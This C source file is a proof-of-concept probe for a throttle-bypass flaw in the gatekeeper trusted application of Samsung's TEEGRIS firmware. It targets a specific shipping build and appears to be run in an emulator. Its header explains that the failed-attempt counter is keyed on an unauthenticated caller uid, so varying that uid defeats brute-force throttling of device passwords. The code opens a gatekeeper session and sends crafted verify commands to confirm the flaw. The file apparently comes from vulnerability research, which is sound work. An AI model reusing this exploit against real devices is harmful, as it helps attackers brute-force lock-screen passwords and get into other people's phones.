/*
 * gatekeeper throttle-bypass probe — SHIPPING S921BXXSFDZE1 build reconfirm.
 *
 * UUID 00000000-0000-0000-0000-474154454b45 (ASCII tail "GATEKE").
 * Finding (RE/samsung_teegris/gatekeeper.md, RE/emulation/gatekeeper.md):
 *   The per-uid fail counter is a persistent object named "gk_fail_counter%u"
 *   where %u is the REE-supplied uid, with NO TEE_GetPropertyAsIdentity /
 *   TEES_GetClientCredentials binding. gk_fail_load runs on every verify
 *   (cmd 0x7e) BEFORE the password HMAC, so a caller that varies the uid lands
 *   on a *different* counter each time => the exponential throttle never accrues
 *   => any enrolled handle can be brute-forced.
 *
 * This driver is a corrected copy of teegris/pocs/gatekeeper_throttle (which
 * used raw malloc() for the memref buffers — the emulator's INTERACTIVE
 * shared-memory bridge rejects that with "memory not allocated with
 * allocate_shm!!!" and the TA never reaches TA_InvokeCommandEntryPoint). Here
 * the three memref buffers are obtained via allocate_param_mem() so they are
 * registered as TEEC shared memory, exactly as the working fbckmr/duldar PoCs do.
 *
 * Param layout (from the fuzz harness 474154454b45_cmd7e): ptypes 0x557 =
 *   [MEMREF_INOUT(p0 = password_handle blob, 0x419),
 *    MEMREF_INPUT (p1 = provided password,   0x3a),
 *    MEMREF_INPUT (p2,                        0x419), NONE].
 *
 * Build (emulator): gcc -DEMULATE gatekeeper_throttle_sfdze1.c -o /poc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337 2>/dev/null"); system("ipcrm -M 0x13338 2>/dev/null");
    system("ipcrm -M 0x13339 2>/dev/null"); system("ipcrm -M 0x1333a 2>/dev/null");
#endif
}

/* one verify with the password_handle param0 (and p1/p2) filled with `fill`.
 * The uid the throttle keys on is read out of the password_handle blob (p0).
 * Buffers are allocated ONCE by the caller and reused (allocate_param_mem caps
 * at 4 registered shared buffers, so we cannot allocate 3 fresh per verify). */
static void verify_with_fill(TEEC_Session *s, unsigned char fill,
                             unsigned char *p0, unsigned char *p1, unsigned char *p2)
{
    TEEC_Operation op;
    memset(p0, fill, 0x419);   /* password_handle blob — uid is read from here */
    memset(p1, fill, 0x3a);    /* provided-password request */
    memset(p2, 0,    0x419);
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_MEMREF_TEMP_INPUT, TEEC_NONE);
    op.params[0].tmpref.buffer = p0; op.params[0].tmpref.size = 0x419;
    op.params[1].tmpref.buffer = p1; op.params[1].tmpref.size = 0x3a;
    op.params[2].tmpref.buffer = p2; op.params[2].tmpref.size = 0x419;
    uint32_t eo;
    TEEC_Result res = TEEC_InvokeCommand_impl(s, 0x7e, &op, &eo);
    printf("[*] verify (param0 filled 0x%02x) -> 0x%x origin 0x%x\n", fill, res, eo);
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-474154454b45";   /* gatekeeper */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                               NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) { printf("OpenSession failed 0x%x/0x%x\n", res, err_origin); exit(-1); }
    printf("[*] session opened to gatekeeper (PUBLIC login)\n");

    /* allocate the 3 memref buffers ONCE and reuse across both verifies. */
    unsigned char *p0 = allocate_param_mem(&context, 0x419);
    unsigned char *p1 = allocate_param_mem(&context, 0x3a);
    unsigned char *p2 = allocate_param_mem(&context, 0x419);
    if (!p0 || !p1 || !p2) { printf("[poc] alloc failed\n"); exit(-1); }

    /* two verifies, different uid bytes -> if the throttle is per-REE-uid
     * (unbound), the host sees two DISTINCT gk_fail_counter<N> objects appear.
     * A structurally-valid (enrolled) password_handle is needed to get PAST
     * gk_blob_parse to the HMAC step; with a garbage handle the run still
     * exercises gk_fail_load (the throttle-name construction) FIRST — which is
     * the whole point: the throttle file name is built from the REE uid before
     * any authentication. */
    verify_with_fill(&session, 0x11, p0, p1, p2);   /* uid 0x11111111 = 286331153 */
    verify_with_fill(&session, 0x22, p0, p1, p2);   /* uid 0x22222222 = 572662306 */

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
